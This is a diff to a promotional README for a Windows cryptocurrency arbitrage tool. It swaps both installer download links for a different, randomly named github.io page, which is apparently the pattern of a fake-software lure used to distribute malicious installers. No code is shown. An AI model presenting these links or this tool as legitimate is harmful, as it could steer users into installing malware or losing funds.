@@ -2,7 +2,7 @@
 
 Exchange Arbitrage Tools is a powerful Windows desktop application designed for cryptocurrency traders and arbitrage enthusiasts. It provides an automated suite of tools to identify and execute arbitrage opportunities across multiple exchanges, helping users maximize profits with minimal effort. Released in 2026, this suite integrates advanced algorithms and user-friendly features for both beginners and experienced traders.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -69,7 +69,7 @@ The tool receives regular updates to improve performance, add new exchange integ
 
 Get the latest version of Exchange Arbitrage Tools from the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Support and Community
 
